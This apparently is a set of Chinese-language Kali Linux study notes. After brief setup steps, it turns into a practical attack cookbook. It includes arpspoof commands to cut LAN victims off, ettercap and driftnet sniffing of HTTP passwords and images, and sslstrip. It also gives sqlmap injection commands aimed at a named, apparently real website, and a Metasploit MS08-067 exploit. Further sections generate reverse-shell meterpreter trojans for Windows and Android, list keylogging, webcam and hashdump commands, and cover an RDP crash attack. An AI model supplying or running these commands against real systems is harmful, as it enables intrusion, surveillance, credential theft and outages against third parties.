##kali虚拟机常见的问题
在本机和虚拟机间的文件交互
- 
- 安装vmtool
- 先解压
- tar vxzf VMtool
- 然后启动vmware-tools


##kali的系统的更新
更新源
root@icunqiu:~# leafpad /etc/apt/sources.list
出现图形化界面
然后在里面加入阿里和中科的更新源
#中科大kali源
deb http://mirrors.ustc.edu.cn/kali sana main non-free contrib
deb http://mirrors.ustc.edu.cn/kali-security/ sana/updates main contrib non-free
deb-src http://mirrors.ustc.edu.cn/kali-security/ sana/updates main contrib non-free
#阿里云kali源
deb http://mirrors.aliyun.com/kali sana main non-free contrib
deb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free
deb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free

root@icunqiu:~# apt-get update

root@icunqiu:~# apt-get dist-upgrade

##kali的系统美化
KDE桌面安装
apt-get install kde-f



##开始使用kali
sqlmap：相当于win下面的名小子，NBSI

##局域网断网攻击也叫arp攻击
工具：arpspoof

指令：arpspoof -i 网卡 -t 目标ip 网关
kali：网卡 eth0
目标：192.168.31.239
默认网关 192.168.1.1

替换掉:arpspoof -i eth0-t 192.168.31.239  192.168.1.1
~# arpspoof -i eth0 -t 192.168.31.22  192.168.1.1

怎么看局域网当中的ip呢？
fping -asg 192.168.31.0/24

为什么断网现象是arp欺骗，却出现断网现象。

出现的错误：
arpspoof: couldn't arp for host
fping -asg 192.168.0.100/24     查看局域网中存活的主机

先ping一下目标主机，看是否ping得通

要攻击需要知到目标ip,网关（网关是啥？）,本机网卡（eth0）。

arpspoof -i eth0 -t 目标IP 网关

 


ps:如果出现arpspoof: couldn't arp for host ，要把虚拟机设置成桥接，或者关闭目标防火墙。


#ARP欺骗
目标的ip 流量会经过我的网卡，从网关出去
（进行ip流量转发）
#ARP断网
目标的ip 流量会经过我的网卡


##进行ip流量转发：
root@icunqiu:~# echo 1 >/proc/sys/net/ipv4/ip_forward
root@icunqiu:~#  vim /proc/sys/net/ipv4/ip_forward
echo ***>/proc/---不会有回显



###driftnet  -》》获取本机网卡的图片
目标的ip他的流量会经过我的网卡 ---》网关
driftnet -i eth0



#http账号密码获取
Arpspoof  -》》欺骗


ettercap----》》欺骗  嗅探 

ettercap -Tq -i eth0
-Tq  启动文本模式
即可监控该ip的http密码



##开启命令行模式
ctrl+alt+f1
/etc/init.d/ssh/  start  开启ssh
然后就可以用xshell连接了


##sststrip
能把https的链接还原为http

端口不一样前者80后者443
http+ssl构建的可进行加密传输





##注入php网站
- sqlmap -u "http://www.tmsyy.com/list.php?fid=3"
- 检测
- 
- 
- sqlmap -u "http://www.tmsyy.com/list.php?fid=3" --is-dba
- 检测是否是dba权限
- 
- sqlmap -u "http://www.tmsyy.com/bencandy.php?fid=168&id=7299" --dbs
- 列出所有的数据库
- 
- sqlmap -u "http://www.tmsyy.com/bencandy.php?fid=168&id=7299" --current-db
- 查询当前表
- 
- sqlmap -u "http://www.tmsyy.com/bencandy.php?fid=168&id=7299" --tables -D "ggec"
- 猜解数据库的表名  根据数据库 


    第一讲.Metasploit框架介绍
    第二讲.Metasploit升级更新
    第三讲.Metasploit端口扫描
    第四讲.Metasploit SMB 获取系统信息
    第五讲.Metasploit 服务识别
    第六讲.Metasploit 密码嗅探
    第七讲.Metasploit SNMP 扫描
    第八讲.Metasploit SMB登陆验证
    第九讲.Metasploit VNC身份识别
    第十讲.Metasploit WMAP Web扫描

##metasploit
输入msfconsole 
- Exploit模块 -》》漏洞利用
- Payloads   -》》shellcode

###使用模块
use exploit/windows/smb/ms08_67_netapi

##选择漏洞利用模块
show options
查看要填入的参数
set RHOST 192.168.31.1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST selfip
执行：exploit

##metasploit 执行远控
这个有教程：http://www.i0day.com/1173.html

1.根据自己的ip生成一个木马
我们的ip是192.168.102.136
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.102.136 LPORT=55555 X > abc.exe


2.use exploit/multi/handler
show options
set PAYLOAD　windows/meterpreter/reverse_tcp

使用这个shellcode
LHOST = 192.168.102.136
LPORT = 55555
这里填生成木马的ip和端口




#木马常用功能
background
sessions 1


##注入进程： 木马随时可能被结束
ps：得到我们要注入的进程
Migrate xxx注入
2036 2004 expoler.exe 这个进程是桌面

##远程桌面
Run vnc  开启远程桌面


##木马文件管理功能
- download     
- edit
- cat
- cd
- mkdir
- mv
- rm
- pwd
- upload
- rmdir


##网络及系统操作
Arp                看缓冲表
ifconfig           ip地址网卡 
getproxy           获取代理
netstat            查看端口链接

kill 结束进程
ps  查看进程
reboot 重启
Reg 修改注册表
shell 拿取shell
shutdown 关闭电脑
sysinfo 系统信息

##用户操作和其他功能讲解
enumdesktops    用户登录数目
keyscan_dump
keyscan_start
keyscan_stop
uictl
webcam_chat
webcam_list
webcam_stream
getsystem  获取高权限
hashdump   下载hash密文


##生成android木马
msfpayload android/meterpreter/reverse_tcp LHOST=192.168.102.136 R > Desktop/abc.apk

安装木马 然后开启exploit即可



##服务器蓝屏攻击
DDOS
服务器开启3389
确定目标  ip
MS12 020

我们服务器远程桌面的一个利用模块
auxliary/scanner/rdp/ms12_020_check
扫描主机是否存在漏洞

RHOST R 开头，远程主机 


目的：比ddos来的更直接一些，但是重启就解决了


##拿webshell
msfpayload webshell/meterpreter/reverse_tcp LHOST=192.168.102.136 R > Desktop/web.shell

安装木马 然后开启exploit即可
